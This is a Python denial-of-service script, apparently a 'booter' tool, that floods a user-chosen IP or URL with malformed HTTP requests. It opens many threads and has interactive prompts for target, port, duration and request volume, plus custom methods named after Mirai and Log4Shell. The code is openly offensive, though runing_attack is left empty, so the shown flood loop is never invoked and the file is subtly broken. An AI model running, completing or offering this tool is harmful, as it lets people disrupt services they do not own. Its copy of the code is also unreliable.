# CHECK IMPORT
try:
    import socket
    import threading
    import string
    import random
    import time
    import os
    import platform
    import sys
    from colorama import Fore
except ModuleNotFoundError as e:
    print(f"{e} CAN'T IMPORT . . . .")
    exit()

# DEF & CLASS

def clear_text():
    if platform.system().upper() == "WINDOWS":
        os.system('cls')
    else:
        os.system('clear')

def status_print(ip,port,thread_id,rps,path_get):
    time.sleep(2)
    print(f"{Fore.YELLOW} [ Z E E F U ]{Fore.LIGHTYELLOW_EX}  Attack {Fore.WHITE}Http {Fore.BLUE}TARGET{Fore.WHITE}={ip}:{port} {Fore.RESET}")
    print(f"{Fore.GREEN} [ Z E E F U ]{Fore.LIGHTBLUE_EX}  Attack{Fore.WHITE} {path_get} {Fore.CYAN} SCRAPE{Fore.BLUE}{rps}{Fore.LIGHTCYAN_EX}ID ⟩::..{Fore.RED}{thread_id}{Fore.RESET}")
def generate_url_path_pyflooder(num):
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, int(num)))
    return data
    
def generate_url_path_choice(num):
    letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
    data = ""
    for _ in range(int(num)):
        data += random.choice(letter)
    return data

# DOS
def DoS_Attack(ip,host,port,type_attack,id,booter_sent,data_type_loader_packet):
    rps = 0
    url_path = ''
    path_get = ['PY_FLOOD','CHOICES_FLOOD']
    path_get_loader = random.choice((path_get))
    if path_get_loader == "PY_FLOOD":
        url_path = generate_url_path_pyflooder(5)
    else:
        url_path = generate_url_path_choice(5)
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        if data_type_loader_packet == 'PY' or data_type_loader_packet == 'PYF':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n".encode()
        elif data_type_loader_packet == 'OWN1':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\r\r".encode()
        elif data_type_loader_packet == 'OWN2':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\r\r\n\n".encode()
        elif data_type_loader_packet == 'OWN3':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n".encode()
        elif data_type_loader_packet == 'OWN4':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n".encode()
        elif data_type_loader_packet == 'OWN5':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n\r\r\r\r".encode()
        s.connect((ip,port))
        for _ in range(booter_sent):
            s.sendall(packet_data)
            s.send(packet_data)
            rps += 2
    except:
        try:
            s.shutdown(socket.SHUT_RDWR)
            s.close()
        except:
            pass
    status_print(ip,port,id,rps,path_get_loader)

status_code = False
id_loader = 0
def runing_attack(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet):
    global status_code,id_loader
        
#DATA
banner = f"""
{Fore.WHITE}  ╔═══════════{Fore.GREEN}   ╔══════════{Fore.YELLOW}  ╔══════════╗{Fore.LIGHTBLUE_EX} ╔═════════╗{Fore.RED}╔══╗    ╔══╗
{Fore.RED} ██████████{Fore.WHITE}  ║{Fore.YELLOW}  ██████████{Fore.GREEN}═╝{Fore.WHITE} ██████████{Fore.YELLOW}═╝{Fore.LIGHTMAGENTA_EX} ██████████{Fore.LIGHTBLUE_EX}═╝██{Fore.RED} ║{Fore.LIGHTBLUE_EX}    ██{Fore.RED} ║
{Fore.RED}        ██{Fore.WHITE}  ║{Fore.YELLOW}   ██{Fore.GREEN} ║{Fore.WHITE}         ██{Fore.YELLOW} ║{Fore.LIGHTMAGENTA_EX}         ██{Fore.LIGHTBLUE_EX} ║        ██{Fore.RED} ║{Fore.LIGHTBLUE_EX}    ██{Fore.RED} ║
{Fore.RED}      ██{Fore.WHITE}  ║{Fore.YELLOW}     ██{Fore.GREEN} ╚═══════╗{Fore.WHITE} ██{Fore.YELLOW} ╚═══════╗{Fore.LIGHTMAGENTA_EX} ██{Fore.LIGHTBLUE_EX} ╚═══════╗██{Fore.RED} ║{Fore.LIGHTBLUE_EX}    ██{Fore.RED} ║
{Fore.RED}     ██{Fore.WHITE}  ║{Fore.YELLOW}      █████████{Fore.GREEN}═╝{Fore.WHITE}  █████████{Fore.YELLOW}═╝{Fore.LIGHTMAGENTA_EX}  █████████{Fore.LIGHTBLUE_EX}═╝ ██{Fore.RED} ║{Fore.LIGHTBLUE_EX}    ██{Fore.RED} ║
{Fore.RED}    ██{Fore.WHITE}  ║{Fore.YELLOW}       ██{Fore.GREEN} ║{Fore.WHITE}         ██{Fore.YELLOW} ║{Fore.LIGHTMAGENTA_EX}         ██{Fore.LIGHTBLUE_EX} ║        ██{Fore.RED} ║{Fore.LIGHTBLUE_EX}    ██{Fore.RED} ║
{Fore.RED}   ██{Fore.WHITE}  ╚═══════{Fore.YELLOW} ██{Fore.GREEN} ╚════════╗{Fore.WHITE}██{Fore.YELLOW} ╚════════╗{Fore.LIGHTMAGENTA_EX}██{Fore.LIGHTBLUE_EX} ╚═╗      ██{Fore.RED} ╚════{Fore.LIGHTBLUE_EX}██{Fore.RED} ║
{Fore.RED}  ███████████{Fore.WHITE}═╝{Fore.YELLOW} ██████████{Fore.GREEN}═╝{Fore.WHITE} ██████████{Fore.YELLOW}═╝{Fore.LIGHTMAGENTA_EX} ██{Fore.LIGHTBLUE_EX}═╝         ████████{Fore.RED}══╝
{Fore.CYAN}     
{Fore.GREEN}╔═════════════════════════════════════════════════════════════════╗
{Fore.GREEN}║{Fore.YELLOW}   Design By: Kun/https://github.com/abatatsa99                  {Fore.GREEN}║
{Fore.GREEN}╚═════════════════════════════════════════════════════════════════╝
{Fore.GREEN}••>Please wait..."""

print(banner)
host = ""
ip = ""
print(f"{Fore.LIGHTBLACK_EX}PYF OWN1-5")
data_type_loader_packet = input(F"{Fore.LIGHTGREEN_EX}TYPE PACKET (DEFAULT=PYF EXAMPLE=OWN1)••> {Fore.YELLOW}").upper()
target_loader = input(f"{Fore.LIGHTGREEN_EX}IP/URL••> {Fore.YELLOW}")
port_loader = int(input(f"{Fore.LIGHTGREEN_EX}PORT••> {Fore.YELLOW}"))
time_loader = time.time() + int(input(f"{Fore.LIGHTGREEN_EX}TIME (DEFAULT=250)••> {Fore.YELLOW}"))
spam_loader = int(input(f"{Fore.LIGHTGREEN_EX}SPAM THREAD (DEFAULT=50 EXAMPLE=299)••> {Fore.YELLOW}"))
create_thread = int(input(F"{Fore.LIGHTGREEN_EX}CREATE THREAD (DEFAULT=50)••> {Fore.YELLOW}"))
booter_sent = int(input(F"{Fore.LIGHTGREEN_EX}BOOTER SENT (DEFAULT=500 EXAMPLE=65536)••> {Fore.YELLOW}"))
print(f"{Fore.LIGHTCYAN_EX}       EXAMPLE HTTP METHODS> CONNECT GET PUT PATCH POST HEAD DELETE OPTIONS TRACE")
print(f"{Fore.LIGHTGREEN_EX}EXAMPLE CUSTOM HTTP METHODS> PANOS MIRAI EXPLOIT LOGSHELL SERVER CLOUDFLARE AGE PYFLOODER GATEWAY")
methods_loader = input(F"{Fore.LIGHTGREEN_EX}HTTP_METHODS (EXAMPLE=GATEWAY)••> {Fore.YELLOW}").upper()
spam_create_thread = int(input(F"{Fore.GREEN}SPAM CREATE THREAD (DEFAULT=5 EXAMPLE=15)••> {Fore.YELLOW}"))
print(f"{Fore.MAGENTA}TRYING TO GET IP:PORT {Fore.LIGHTMAGENTA_EX}. . .{Fore.RESET}")
try:
    host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
    ip = socket.gethostbyname(host)
except socket.gaierror:
    exit()
for loader_num in range(create_thread):
    sys.stdout.write(f"\r {Fore.YELLOW}{loader_num} CREATE THREAD . . .{Fore.RESET}")
    sys.stdout.flush()
    
    for _ in range(spam_create_thread):
        threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet)).start()
clear_text()
print(banner)
status_code = True
print(f"{Fore.GREEN}TRYING SENT . . .{Fore.RESET}")

